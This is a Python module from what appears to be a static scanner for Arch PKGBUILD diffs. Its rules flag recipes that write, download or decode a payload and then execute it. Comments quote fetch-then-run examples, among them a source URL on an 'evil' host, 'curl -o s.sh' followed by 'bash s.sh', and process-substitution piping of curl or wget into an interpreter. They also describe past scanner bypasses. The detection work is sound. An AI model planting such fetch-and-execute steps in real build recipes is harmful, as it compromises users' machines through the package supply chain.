"""- July delivery stack (Class A) rules.

H067-H072 share a threat: the PKGBUILD carries or creates the payload it
later executes.  The rules are code rather than rules.toml entries because
each needs more than a regex: H067 needs position scoping against a config
list, H068 needs actual decoding of candidate blobs, and H069/H072 need
same-function write-then-execute path tracking.

Everything here is static.  Nothing is decoded into an executed string;
``base64.b64decode`` produces bytes that are checked against executable
magic and then discarded.

H066-tree (the git-tree variant) lives here as ``scan_tree_manifest``;
H066-blob (an ELF blob embedded in the PKGBUILD) is H068's job, so the two
never double-fire on the same evidence.  H070 (archive trailer anomaly) is
a pure function in :mod:`trustsight.analysis.archives`.
"""

import base64
import binascii
import fnmatch
import os
import re
import shlex
from functools import lru_cache
from ...config import (
    ANY_EXECUTOR as _ANY_EXECUTOR,
    EXEC_WRAPPER as _EXEC_WRAPPER,
    NETWORK_CLIENT as _NETWORK_CLIENT,
    PAYLOAD_PRODUCER as _PAYLOAD_PRODUCER,
    SCRIPT_EXECUTOR as _SCRIPT_EXECUTOR,
    _SUBCOMMAND_OPTS as _SUBCOMMAND_OPTS,
)
from ...coverage import note_stage_failure
from ...diffdoc import parse_diff_lines
from ...config import (
    DEFAULT_ANTI_ANALYSIS_PROBES,
    load_patterns,
)
from ...deps import _strip_comment
from ...findings import stamp
from ...line_lex import lex_lines
from ...rules import (
    MAX_RULE_LINE_BYTES,
    ScopeResolver,
    _classify_enclosing_function,
)
from ...tokenizer import resolve_added_lines, split_lines
from ..build import (
    _CRITICAL_FUNCTIONS,
    _INSTALL_HOOKS,
    _INTERPRETER_FETCH,
    _recipe_lines,
)
from ...rules import find_line_in_diff
from ._buildtree import (
    _ARRAY_BINDING_RE,
    _COMMITTED_CARRIER_RE,
    _COMMITTED_PAYLOAD_RE,
    _EXECSTART_RE,
    _INSTALL_CMD_RE,
    _LOOP_BINDING_RE,
    _PATH_ASSIGN_RE,
    _PATH_BUILD_DIR_RE,
    _POSITIONAL_NAMES,
    _SET_POSITIONAL_RE,
    _STARTDIR_PATH_RE,
    _TEST_DIR_RE,
    _TEST_NAME_RE,
    _committed_execution_findings,
    _implicit_build_input,
    _installed_executables,
    _is_test_fixture,
    _loop_bindings,
    _matches_committed,
    scan_tree_manifest,
)
from ._common import (
    _BUILD_FUNCTIONS,
    _BUILD_ONLY_PATH_RE,
    _BUILD_ROOT_RE,
    _CMD_START,
    _COPY_WRITE_RE,
    _DECODER_WRITE_RE,
    _DESCRIPTIVE_FIELD_RE,
    _ELF_MAGIC,
    _EXECUTION_RE,
    _EXEC_PREFIX,
    _GENERATION_WRITE_RE,
    _H072_BENIGN_EXEC,
    _HEREDOC_OPEN_RE,
    _HEREDOC_PATH_BEFORE_RE,
    _HEREDOC_PIPED_RE,
    _HEREDOC_TO_EXECUTING_CONFIG_RE,
    _HEREDOC_TO_INTERPRETER_RE,
    _IMPLICIT_BUILD_INPUTS,
    _INTERPRETER_WRITE_RE,
    _MACHO_MAGICS,
    _NOT_A_PATH_RE,
    _PATCH_APPLY_RE,
    _PE_MAGIC,
    _PRINTED_HEREDOC_OPENER_RE,
    _PRODUCER_REDIRECT_RE,
    _SCOPE_FUNCTIONS,
    _SHEBANG_MAGIC,
    _SRCINFO_SOURCE_RE,
    _VCS_SOURCE_RE,
    _collect_writes,
    _created_source_dirs,
    _declared_extraction_dirs,
    _declared_extraction_dirs_cached,
    _declared_source_basenames,
    _declared_source_basenames_cached,
    _declared_source_entries_cached,
    _unpinned_source_basenames,
    _find_line,
    _heredoc_body_indices,
    _heredoc_body_indices_cached,
    _is_directory_path,
    _norm_path,
    _not_a_path,
    _printed_heredoc_body_indices,
    _printed_heredoc_body_indices_cached,
    _source_basename,
)
from ._dispatch import (
    _delivery_findings,
)
from ._payloads import (
    _B64_RUN_RE,
    _HEX_RUN_RE,
    _PIPE_TO_SHELL_RE,
    _SHELL_LEAD_TOKEN_RE,
    _decode_b64,
    _decode_hex,
    _magic_name,
    _payload_name,
    _reconstructed_payload_findings,
    _uu_blocks,
)
from ._recon import (
    _anti_analysis_findings,
    _anti_analysis_probes,
)
from ._transitions import (
    _FLOATING_PATH_RE,
    _SOURCE_ARRAY_NAME_RE,
    _URL_HOST_RE,
    _pinning_of,
    _recipe_states,
    _registered_domain_of,
    _source_urls_by_local_name,
    install_hook_notice_only,
    install_hook_transition,
    pinning_lost,
    source_name_host_swaps,
)
from ._unread import (
    _BOOT_ARTIFACT_RE,
    _CONTENT_WRITE_RE,
    _COPY_SOURCE_RE,
    _FD_REDIRECT_RE,
    _MAKE_TARGET_RE,
    _MANIFEST_ARG_RE,
    _PACKAGING_FUNCTIONS,
    _PATCH_APPLY_RUNTIME_RE,
    _PKGDIR_TARGET_RE,
    _QUOTED_SEGMENT_RE,
    _SANDBOX_WRAPPER_RE,
    _STANDARD_TARGETS,
    _W001_RE,
    _generated_config_findings,
    _unread_manifest_findings,
    _unread_patch_findings,
    _unread_target_findings,
    _unverifiable_findings,
)
from ._write_exec import (
    _CLONE_DEST_RE,
    _COMMAND_ARG_DRIVER_RE,
    _DEFAULT_DEST_RE,
    _DRIVER_CHDIR_RE,
    _DRIVER_INPUT_FLAG_RE,
    _FETCH_CLIENT_RE,
    _FETCH_OUTPUT_RE,
    _FETCH_SCOPE_FUNCTIONS,
    _INTERPRETER_OUTPUT_RE,
    _LINE_URL_RE,
    _OPERAND_DRIVER_RE,
    _OUTPUT_FLAG_CLIENTS,
    _NON_FILE_FETCH_CLIENTS,
    _PACKAGE_MANAGER_FETCH_RE,
    _PHASE_RANK,
    _PKGDIR_LINE_RE,
    _PROC_SUBST_STDIN_RE,
    _SOURCE_EXEC_RE,
    _body_references,
    _body_under_dir,
    _clone_destinations,
    _collect_executions,
    _collect_fetch_outputs,
    _declared_source_urls,
    _driver_commands,
)

def edge_write_execute(ctx, add) -> None:
    """H069/H072 predicate over the shared graph context.

    Same-function write-then-execute dataflow: a path written by the recipe
    and later executed in the same build function is a delivered payload.
    """
    source_basenames = ctx.source_basenames

    writes_by_fn: dict[str, list[tuple[str, str]]] = {}
    h069_claimed: set[tuple[str, str]] = set()

    for i, line in enumerate(ctx.lines):
        fn = ctx.scopes.within(i, _SCOPE_FUNCTIONS)
        if not line.startswith("+") or fn is None:
            continue
        if i in ctx.heredoc_body:
            continue
        if len(line) > MAX_RULE_LINE_BYTES:
            continue
        body = _strip_comment(line[1:])

        for kind, path in _collect_writes(body, fn):
            writes_by_fn.setdefault(fn, []).append((kind, path))

        for path in _collect_executions(body):
            base = os.path.basename(path)
            for (kind, wpath) in list(writes_by_fn.get(fn, [])):
                if wpath != path and os.path.basename(wpath) != base:
                    continue
                if (fn, wpath) in h069_claimed:
                    continue
                h069_claimed.add((fn, wpath))
                if kind == "generation":
                    add("H069", "Build-time Generation Then Execution", "HIGH", "execution",
                        f"{fn}() generates {wpath or path} and then executes it",
                        line=_find_line(ctx.diff_text, path or base),
                        position=fn, path=path)
                    return
                if base in _H072_BENIGN_EXEC or base in source_basenames:
                    continue
                add("H072", "Write Then Execute", "HIGH", "execution",
                    f"{fn}() writes {wpath or path} and then executes it",
                    line=_find_line(ctx.diff_text, path or base),
                    position=fn, path=path)
                return

_INPUT_FILE_RE = re.compile(
    r"(?:^|\s)(?:-i|--input-file)[= ](\"[^\"]+\"|'[^']+'|\S+)")

def edge_fetch_then_execute(ctx, add) -> None:
    """A downloader writes a file and the same function later executes it (H082).

    R001/R002 own the single-line pipe form; H082 owns the split form.
    Files that arrived via the declared ``source=()`` array are deliberately
    excluded here - they have their own rule (H083) so checksum-bearing
    source files are not double-counted.

    Fetches are collected from added *and* context lines, but a chain only
    fires when at least one of its two halves is new in this diff
    (bypass dbf38ba3: ``curl -o s.sh`` sitting unchanged on a context line
    with ``bash s.sh`` added, or the mirror image, scored nothing because
    the pairing pass never saw the unchanged half).  A fetch and its exec
    both pre-existing on context lines is ordinary build code; the pairing
    also never attributes an added fetch to a *removed* line, so removed
    lines are skipped entirely.

    The second half of the pass is the *unattributed* arm: a client whose
    output grammar names no file (``sftp``, ``ftp``, ``ssh``, ``git fetch``,
    ``ipfs get``, a glued or server-decided flag) still brings bytes onto
    the machine, and a later execution of an undeclared, non-benign file in
    the same reachable scope is the same chain.  Pairing is by order and
    phase: a fetch in prepare pairs with an execution in build/check/package
    (makepkg runs them in that order), never the reverse.  ``$pkgdir``
    executions are the package's own output and are exempt; declared and
    benign build-artifact basenames are exempt for the same reason the
    attributed arm exempts them.
    """
    from ..network import claims_pipe_to_shell, claims_upload_line

    diff_text = ctx.diff_text
    config = ctx.config
    lines = ctx.lines
    scopes = ctx.scopes
    source_basenames = ctx.source_basenames
    declared_urls = ctx.declared_urls
    heredoc_body = ctx.heredoc_body

    #: Fetched paths pair with executions across the diff boundary, so each
    #: entry carries whether the fetch line itself was added: a chain fires
    #: only when the fetch or the execution (or both) is new - two context
    #: halves are pre-existing code, not a chain this diff created.  Fetches
    #: are collected in a pre-pass over every non-removed line so that an
    #: execution added *above* a pre-existing fetch still pairs with it
    #: (bypass dbf38ba3); within one function the pairing is by name, not by
    #: line order, because either order lands bytes on disk that the other
    #: line then runs.
    fetched_by_fn: dict[str, list[tuple[str, bool]]] = {}
    cloned_by_fn: dict[str, list[tuple[str, bool]]] = {}
    #: path -> basenames of the URLs a heredoc wrote into that file
    #: (`cat > urls <<EOF` + URL lines): `wget -i urls` fetches those
    #: addresses without one appearing on the client's own line.
    url_inputs: dict[str, list[str]] = {}
    #: The write the current line's heredoc (if any) is filling.
    heredoc_path = ""
    #: (phase rank, line index, client, fetch scope) for fetches whose
    #: destination the grammar cannot name.  A scheme-bearing URL is left
    #: to H016/H082's attributed arm, so one command is not scored twice -
    #: unless the only scheme URL on the line is a declared source, which is
    #: a decoy argument and names no output of this fetch.
    pending_fetch: list[tuple[int, int, str, str]] = []

    for i, line in enumerate(lines):
        if line.startswith("-"):
            continue
        fn = scopes.within(i, _FETCH_SCOPE_FUNCTIONS)
        if i in heredoc_body:
            # A heredoc that wrote a file (`cat > urls <<EOF`) fills it
            # with its body; a URL line there is the address `wget -i urls`
            # fetches, with none on the client's own line.
            if fn is not None and heredoc_path and len(line) <= MAX_RULE_LINE_BYTES:
                for u in _LINE_URL_RE.findall(line):
                    base = _source_basename(u)
                    if base:
                        url_inputs.setdefault(heredoc_path, []).append(base)
            continue
        if fn is None:
            continue
        if len(line) > MAX_RULE_LINE_BYTES:
            continue
        body = _strip_comment(line[1:])
        writes = [w for _k, w in _collect_writes(body, fn) if w]
        heredoc_path = _norm_path(writes[-1]) if writes else ""
        outputs = _collect_fetch_outputs(body, declared_urls)
        for path in outputs:
            fetched_by_fn.setdefault(fn, []).append(
                (path, line.startswith("+")))
        for directory in _clone_destinations(body):
            cloned_by_fn.setdefault(fn, []).append(
                (directory, line.startswith("+")))
        client = _FETCH_CLIENT_RE.search(body)
        if client and client.group(0).lower() in _NON_FILE_FETCH_CLIENTS:
            client = None
        if client and _PACKAGE_MANAGER_FETCH_RE.search(body):
            # `cargo fetch`/`npm ci` resolve a registry; W002 owns that
            # boundary and does not pair it with a later script execution.
            client = None
        if client:
            for m in _INPUT_FILE_RE.finditer(body):
                for base in url_inputs.get(_norm_path(m.group(1)), ()):
                    fetched_by_fn.setdefault(fn, []).append(
                        (base, line.startswith("+")))
        if (client and (not outputs or "://" not in body)
                and not claims_pipe_to_shell(body)
                and not claims_upload_line(body, config)):
            pending_fetch.append(
                (_PHASE_RANK.get(fn, 9), i, client.group(0)[:40], fn))

    for i, line in enumerate(lines):
        if line.startswith("-"):
            continue
        added = line.startswith("+")
        fn = scopes.within(i, _FETCH_SCOPE_FUNCTIONS)
        if fn is None:
            continue
        if i in heredoc_body:
            continue
        # A line the rules engine clamps cannot be read by the pairing
        # passes either; the run already declares `line_truncated`.
        if len(line) > MAX_RULE_LINE_BYTES:
            continue
        body = _strip_comment(line[1:])

        # A rename of a fetched artifact is the same payload under a new
        # name: a transform that reads a path under a clone directory (or a
        # fetched output) and writes a new file makes that file pairable.
        for _kind, wpath in _collect_writes(body, fn):
            if not wpath:
                continue
            if (_body_references(body, [p for p, _a in fetched_by_fn.get(fn, ())])
                    or _body_under_dir(body, [d for d, _a in cloned_by_fn.get(fn, ())])):
                fetched_by_fn.setdefault(fn, []).append((wpath, added))

        # An interpreter reading a fetch's stdout through a process
        # substitution is the chain on one line: `python3 < <(curl URL)`.
        # The stdin redirect guard in `_EXECUTION_RE` keeps `<(` out, so
        # this is its own read of the same evidence.  Only an added line
        # can fire: the chain must be new in this diff.
        if added:
            for subst in _PROC_SUBST_STDIN_RE.finditer(body):
                if _FETCH_CLIENT_RE.search(subst.group(1)):
                    add("H082", "Fetch Then Execute", "CRITICAL", "network_execution",
                        f"{fn}() executes the output of a fetch through a "
                        "process substitution",
                        line=_find_line(diff_text, "python" if "python" in body
                                        else body.strip()[:40]),
                        position=fn, path="<process-substitution>")
                    return

        for path in _collect_executions(body):
            base = os.path.basename(path)
            for directory, fetch_added in cloned_by_fn.get(fn, []):
                if directory and path.startswith(directory.rstrip("/") + "/"):
                    if not (added or fetch_added):
                        continue
                    add("H082", "Fetch Then Execute", "CRITICAL",
                        "network_execution",
                        f"{fn}() clones into {directory} and then executes "
                        f"{path} from it",
                        line=_find_line(diff_text, path or base),
                        position=fn, path=path)
                    return
            for fpath, fetch_added in list(fetched_by_fn.get(fn, [])):
                fbase = os.path.basename(fpath)
                if fpath != path and fbase != base:
                    continue
                if not (added or fetch_added):
                    continue  # both halves pre-existing: not this diff's chain
                # The benign-artifact exemption claims "this file came with
                # the project".  A `Makefile` this recipe just downloaded
                # did not, and `curl -o Makefile URL` followed by `make`
                # was reading the filename instead of the provenance - the
                # same mistake the committed-`configure` case made.
                if base in source_basenames:
                    continue
                add("H082", "Fetch Then Execute", "CRITICAL", "network_execution",
                    f"{fn}() downloads {fpath or path} and then executes it",
                    line=_find_line(diff_text, path or base),
                    position=fn, path=path)
                return
            # Unattributed arm (see the docstring).  An unknown path (`$f`
            # from a loop over a directory a fetch just filled) is exactly
            # the shape being paired, so it is not filtered out here.
            if base in source_basenames or base in _H072_BENIGN_EXEC:
                continue
            if _PKGDIR_LINE_RE.search(body):
                continue
            rank = _PHASE_RANK.get(fn, 9)
            for fetch_rank, fetch_index, fetch_client, fetch_fn in pending_fetch:
                fetch_added = lines[fetch_index].startswith("+")
                if not (added or fetch_added):
                    continue  # both halves pre-existing: not this diff's chain
                if fetch_index > i or fetch_rank > rank:
                    continue
                # A fetch and an execution on the same line pair only when
                # the fetch comes first, or when a process substitution
                # feeds the execution (`escript /dev/stdin < <(wget …)`).
                if fetch_index == i:
                    client_pos = body.find(fetch_client.split()[0])
                    exec_pos = body.find(base)
                    if (client_pos != -1 and exec_pos != -1
                            and client_pos > exec_pos
                            and "<(" not in body and ">(" not in body):
                        continue
                if fetch_fn == fn:
                    match = (f"{fn}() fetches from an unattributed client "
                             f"({fetch_client}) and then executes {path}")
                else:
                    match = (f"{fetch_fn}() fetches from an unattributed client "
                             f"({fetch_client}); {fn}() later executes {path}")
                add("H082", "Fetch Then Execute", "CRITICAL", "network_execution",
                    match,
                    line=_find_line(diff_text, path or base),
                    position=fn, path=path)
                return

_NUL_SUFFIX_RE = re.compile(r"(?:\\x00|\\0|\\u0000)+$")

def edge_source_file_execution(ctx, add) -> None:
    """H083 predicate over the shared graph context.

    A file downloaded via ``source=()`` is executed as a script.  Only a
    source whose content is unpinned fires - ``SKIP`` or no checksum array:
    there the host decides at fetch time what runs.  A real checksum pins
    the executed bytes to what the packager vetted, and running such a
    helper (pkl-lsp's merge-lsp4j-metadata.py) is ordinary packaging.  The
    facts come from *ctx*.
    """
    source_basenames = ctx.source_basenames
    # Only sources whose content is unpinned are findings: a real checksum
    # means the executed file is exactly what the packager vetted, and
    # running a pinned helper script is ordinary packaging.  `SKIP` (or no
    # checksum array at all) leaves the host deciding at fetch time.
    unpinned = ctx.unpinned_source_basenames
    # `source=("https://evil/${url:-stage.sh}")` downloads under the
    # expansion's fallback when the variable is unset - which is the fresh
    # environment an AUR helper builds in - so `bash "$srcdir/stage.sh"`
    # executes that declared download.
    fallback_names = {
        s.rsplit(":-", 1)[1].rstrip("}").rsplit("/", 1)[-1]
        for s in source_basenames if ":-" in s
    }
    #: fn -> {renamed basename: declared source basename}.  A transform that
    #: reads a declared file and writes a new name (`awk '1' "$srcdir/x" >
    #: run.me`) makes the new name the same payload.
    aliases_by_fn: dict[str, dict[str, str]] = {}
    for i, line in enumerate(ctx.lines):
        fn = ctx.scopes.within(i, _BUILD_FUNCTIONS)
        if not line.startswith("+") or fn is None:
            continue
        if i in ctx.heredoc_body:
            continue
        if len(line) > MAX_RULE_LINE_BYTES:
            continue
        body = _strip_comment(line[1:])

        patch = _PATCH_APPLY_RE.search(body)
        patch_base = os.path.basename(_norm_path(patch.group(1))) if patch else ""

        for _kind, wpath in _collect_writes(body, fn):
            wbase = os.path.basename(wpath)
            if not wbase:
                continue
            for sbase in source_basenames:
                if sbase and re.search(
                        rf"(?<![\w.-]){re.escape(sbase)}(?![\w.-])", body):
                    aliases_by_fn.setdefault(fn, {})[wbase] = sbase
                    break

        for m in _SOURCE_EXEC_RE.finditer(body):
            raw = next((g for g in m.groups() if g), None)
            if not raw:
                continue
            if _not_a_path(raw):
                # A glob that still names a file (`bash "$srcdir"/*.sh`)
                # executes the declared source pattern `https://…/*.sh`.
                # The same holds for the literal `$` of `stage$.sh` and the
                # brace characters of `stage{}.sh` - neither is an
                # expansion; a bare `*` or a real `${var}` stays rejected.
                bare = _BUILD_ROOT_RE.sub("", _norm_path(raw)).strip("\"'")
                probe = re.sub(r"[*?]", "", bare)
                probe = re.sub(r"\$(?![\w{(])", "", probe)
                probe = re.sub(r"(?<!\$)[\[\]{}]", "", probe)
                if not ("." in os.path.basename(bare)
                        and not re.search(r"[\[\]{}%`$]", probe)):
                    continue
            path = _norm_path(raw)
            base = os.path.basename(path)
            if not base:
                continue
            # A URL's trailing `\x00` escape never reaches the filename -
            # the filesystem and makepkg truncate at the NUL - so the
            # declared `stage.sh\x00` and the executed `stage.sh` are one
            # file.
            cbase = _NUL_SUFFIX_RE.sub("", base)
            declared = {_NUL_SUFFIX_RE.sub("", s) for s in source_basenames}
            if patch_base and base == patch_base:
                continue
            alias_of = aliases_by_fn.get(fn, {}).get(base)
            if cbase in declared or cbase in fallback_names:
                if cbase not in unpinned and cbase not in fallback_names:
                    continue  # pinned by a real checksum: vetted packaging
                message = f"{fn}() executes declared source file {cbase}"
            elif alias_of:
                if alias_of not in unpinned:
                    continue  # the renamed payload is checksum-pinned
                message = (f"{fn}() executes {base}, a rename of declared "
                           f"source file {alias_of}")
            else:
                continue
            add("H083", "Downloaded Source File Executed", "HIGH", "execution",
                message,
                line=_find_line(ctx.diff_text, raw.strip().strip('"\'')[:60] or base),
                position=fn, path=path)
            return

#: Subcommands of a script *runtime*.  ``bun run build`` / ``deno run x``
#: name a subcommand, not a file, so the token the interpreter arm captures
#: (``run``) has no provenance because it is not a path at all.  Keyed to
#: bun/deno only: ``bash run`` still executes a file called ``run``.
_RUNTIME_SUBCOMMANDS = frozenset({
    "run", "install", "i", "add", "a", "remove", "rm", "uninstall",
    "update", "upgrade", "link", "unlink", "publish", "patch", "build",
    "test", "bench", "x", "exec", "repl", "create", "init", "pm", "ci",
    "why", "outdated", "audit", "info", "license", "dedupe", "prune",
    "bunx", "trust", "eval", "fmt", "lint", "check", "bundle", "compile",
    "doc", "coverage", "task", "cache", "vendor", "completions", "types",
    "lsp", "serve", "jupyter",
})
_RUNTIME_BINARY_RE = re.compile(r"(?<![\w/.-])(?:bun|deno)\s")


def edge_undeclared_provenance_execution(ctx, add) -> None:
    """X033 predicate: a ``$srcdir``-root file with no provenance is run.

    ``bash "$srcdir"/stage.sh`` where ``stage.sh`` is not a declared
    source, not written by the recipe, and not the unpacked content of a
    checksummed tarball (which lands in a subdirectory) — the file came
    from nowhere.  H083 fires only on declared names; this covers the
    undeclared complement that the source-array campaign identified as a
    total silence.
    """
    source_basenames = ctx.source_basenames
    written: set[str] = set()
    for i, line in enumerate(ctx.lines):
        if line.startswith("-") or i in ctx.heredoc_body:
            continue
        fn = ctx.scopes.within(i, _BUILD_FUNCTIONS)
        if fn is None or len(line) > MAX_RULE_LINE_BYTES:
            continue
        body = _strip_comment(line[1:])
        for _kind, wpath in _collect_writes(body, fn):
            if wpath:
                written.add(os.path.basename(wpath))
    for i, line in enumerate(ctx.lines):
        if not line.startswith("+") or i in ctx.heredoc_body:
            continue
        fn = ctx.scopes.within(i, _BUILD_FUNCTIONS)
        if fn is None or len(line) > MAX_RULE_LINE_BYTES:
            continue
        body = _strip_comment(line[1:])
        for m in _SOURCE_EXEC_RE.finditer(body):
            raw = next((g for g in m.groups() if g), None)
            if not raw:
                continue
            # An interpreter flag is not a file: ``python -m build`` captures
            # ``-m``, which has no provenance because it is not a path.
            if raw.startswith("-"):
                continue
            # A subcommand of a script runtime is not a file either.
            if raw in _RUNTIME_SUBCOMMANDS and _RUNTIME_BINARY_RE.search(m.group(0)):
                continue
            # The bare `./script` arm drops the `./` from its capture, so a
            # relative path would otherwise read as a `$srcdir`-root file.
            # `./build` runs the project's own script inside the unpacked
            # tree; only a `$srcdir`-root file has no provenance.
            if m.group(0).rstrip().endswith("./" + raw):
                continue
            path = _norm_path(raw)
            # Only a ``$srcdir``-root file: legitimate build scripts live
            # inside the unpacked tree (``$srcdir/pkg-ver/stage.sh``) or
            # are reached by a relative path after ``cd``; the root is
            # where a bare download lands.  The strip is on the raw token
            # because ``_norm_path`` has already removed the root prefix
            # and with it the evidence of which root it was.
            bare = _BUILD_ROOT_RE.sub("", raw).strip("\"'")
            if not bare or "/" in bare:
                continue
            base = bare
            if (base in source_basenames or base in written
                    or base in _H072_BENIGN_EXEC):
                continue
            if _FETCH_CLIENT_RE.search(body):
                continue  # H082 owns the fetch-then-execute chain
            add("X033", "File With No Provenance Executed", "HIGH", "execution",
                f"{fn}() executes {base}, a file that is neither a declared "
                "source, a build artifact, nor written by the recipe",
                line=_find_line(ctx.diff_text, raw.strip().strip('"\'')[:60] or base),
                position=fn, path=path)
            return

def edge_unread_execution(ctx, add) -> None:
    """W001/H094 predicate over the shared graph context.

    Code from the unpacked tree runs and nobody read it.  H094 is the same
    act in ``package()`` where it is not ordinary; W001 is the weight-0
    report everywhere else.  The facts (resolved lines, scope, declared
    basenames, heredoc bodies) come from *ctx*, computed once.
    """
    committed = {os.path.basename(name.rstrip("/"))
                 for name, _head in (ctx.tree_manifest or ())}

    for i, line in enumerate(ctx.lines):
        fn = ctx.scopes.within(i, _BUILD_FUNCTIONS)
        if not line.startswith("+") or fn is None or i in ctx.heredoc_body:
            continue
        body = _strip_comment(line[1:])
        m = _W001_RE.search(body)
        if not m:
            continue
        raw = m.group(1) or m.group(2) or m.group(3)
        if not raw:
            continue
        # The absolute-path arm is only meaningful under a new root.
        if raw.startswith("/") and not _SANDBOX_WRAPPER_RE.search(body):
            continue
        if _not_a_path(raw):
            continue
        base = os.path.basename(_norm_path(raw))
        if not base or base in _H072_BENIGN_EXEC:
            continue
        # Anything already claimed by a scoring rule is not this rule's
        # subject: W001 is what is left when nothing else could speak.
        if base in ctx.source_basenames or base in committed:
            continue
        if fn in _PACKAGING_FUNCTIONS:
            add("H094", "Unread Script Executed During Packaging", "HIGH",
                "execution",
                f"{fn}() runs {raw}, whose content was never read, while "
                "staging the files that become the package",
                line=_find_line(ctx.diff_text, raw[:60]), position=fn, path=raw)
            return
        add("W001", "Executes Code This Analysis Did Not Read", "INFO",
            "unverifiable",
            f"{fn}() runs {raw}, which is neither declared in source=() nor "
            f"committed to this repository, so its content was never read",
            line=_find_line(ctx.diff_text, raw[:60]), position=fn, path=raw)
        return


__all__ = ['DEFAULT_ANTI_ANALYSIS_PROBES', 'MAX_RULE_LINE_BYTES', 'ScopeResolver', '_ANY_EXECUTOR', '_ARCHIVE_BASENAME_RE', '_ARRAY_BINDING_RE', '_B64_RUN_RE', '_BOOT_ARTIFACT_RE', '_BUILD_FUNCTIONS', '_BUILD_ONLY_PATH_RE', '_BUILD_ROOT_RE', '_CLONE_DEST_RE', '_CMD_START', '_COMMAND_ARG_DRIVER_RE', '_COMMITTED_CARRIER_RE', '_COMMITTED_PAYLOAD_RE', '_CONTENT_WRITE_RE', '_COPY_SOURCE_RE', '_COPY_WRITE_RE', '_CRITICAL_FUNCTIONS', '_DECODER_WRITE_RE', '_DEFAULT_DEST_RE', '_DESCRIPTIVE_FIELD_RE', '_DRIVER_CHDIR_RE', '_DRIVER_INPUT_FLAG_RE', '_ELF_MAGIC', '_EXECSTART_RE', '_EXECUTION_RE', '_EXEC_PREFIX', '_EXEC_WRAPPER', '_FD_REDIRECT_RE', '_FETCH_CLIENT_RE', '_FETCH_OUTPUT_RE', '_FETCH_SCOPE_FUNCTIONS', '_FLOATING_PATH_RE', '_GENERATION_WRITE_RE', '_H072_BENIGN_EXEC', '_HEREDOC_OPEN_RE', '_HEREDOC_PATH_BEFORE_RE', '_HEREDOC_PIPED_RE', '_HEREDOC_TO_EXECUTING_CONFIG_RE', '_HEREDOC_TO_INTERPRETER_RE', '_HEX_RUN_RE', '_IMPLICIT_BUILD_INPUTS', '_INPUT_FILE_RE', '_INSTALL_CMD_RE', '_INSTALL_HOOKS', '_INTERPRETER_FETCH', '_INTERPRETER_OUTPUT_RE', '_INTERPRETER_WRITE_RE', '_LINE_URL_RE', '_LOOP_BINDING_RE', '_MACHO_MAGICS', '_MAKE_TARGET_RE', '_MANIFEST_ARG_RE', '_NETWORK_CLIENT', '_NOT_A_PATH_RE', '_NUL_SUFFIX_RE', '_OPERAND_DRIVER_RE', '_OUTPUT_FLAG_CLIENTS', '_PACKAGING_FUNCTIONS', '_PATCH_APPLY_RE', '_PATCH_APPLY_RUNTIME_RE', '_PATH_ASSIGN_RE', '_PATH_BUILD_DIR_RE', '_PAYLOAD_PRODUCER', '_PE_MAGIC', '_PHASE_RANK', '_PIPE_TO_SHELL_RE', '_PKGDIR_LINE_RE', '_PKGDIR_TARGET_RE', '_POSITIONAL_NAMES', '_PRINTED_HEREDOC_OPENER_RE', '_PROC_SUBST_STDIN_RE', '_PRODUCER_REDIRECT_RE', '_QUOTED_SEGMENT_RE', '_SANDBOX_WRAPPER_RE', '_SCOPE_FUNCTIONS', '_SCRIPT_EXECUTOR', '_SET_POSITIONAL_RE', '_SHEBANG_MAGIC', '_SHELL_LEAD_TOKEN_RE', '_SOURCE_ARRAY_NAME_RE', '_SOURCE_EXEC_RE', '_SRCINFO_SOURCE_RE', '_STANDARD_TARGETS', '_STARTDIR_PATH_RE', '_SUBCOMMAND_OPTS', '_TEST_DIR_RE', '_TEST_NAME_RE', '_URL_HOST_RE', '_VCS_SOURCE_RE', '_W001_RE', '_anti_analysis_findings', '_anti_analysis_probes', '_body_references', '_body_under_dir', '_boot_artifact_findings', '_classify_enclosing_function', '_clone_destinations', '_collect_executions', '_collect_fetch_outputs', '_collect_writes', '_committed_build_path_finding', '_committed_execution_findings', '_committed_payload_finding', '_created_source_dirs', '_declared_extraction_dirs', '_declared_extraction_dirs_cached', '_declared_source_basenames', '_declared_source_basenames_cached', '_declared_source_entries_cached', '_declared_source_urls',
    '_unpinned_source_basenames', '_decode_b64', '_decode_hex', '_delivery_findings', '_driver_commands', '_fetch_then_execute_findings', '_find_line', '_foreign_declared_source_bases', '_generated_config_findings', '_heredoc_body_indices', '_heredoc_body_indices_cached', '_implicit_build_input', '_installed_executables', '_is_archive_url', '_is_directory_path', '_is_test_fixture', '_loop_bindings', '_magic_name', '_matches_committed', '_norm_path', '_not_a_path', '_packaged_content_findings', '_path_injection_findings', '_payload_name', '_pinning_of', '_printed_heredoc_body_indices', '_printed_heredoc_body_indices_cached', '_recipe_lines', '_recipe_states', '_reconstructed_payload_findings', '_registered_domain_of', '_report_packaged_path', '_service_binary_findings', '_source_basename', '_source_file_execution_findings', '_source_urls_by_local_name', '_strip_comment', '_unread_execution_findings', '_unread_manifest_findings', '_unread_patch_findings', '_unread_target_findings', '_unverifiable_findings', '_uu_blocks', '_write_execute_findings', 'base64', 'binascii', 'edge_fetch_then_execute', 'edge_source_file_execution', 'edge_undeclared_provenance_execution', 'edge_unread_execution', 'edge_write_execute', 'find_line_in_diff', 'fnmatch', 'install_hook_notice_only', 'install_hook_transition', 'lex_lines', 'load_patterns', 'lru_cache', 'note_stage_failure', 'os', 'parse_diff_lines', 'pinning_lost', 're', 'resolve_added_lines', 'scan_tree_manifest', 'shlex', 'source_name_host_swaps', 'split_lines', 'stamp']
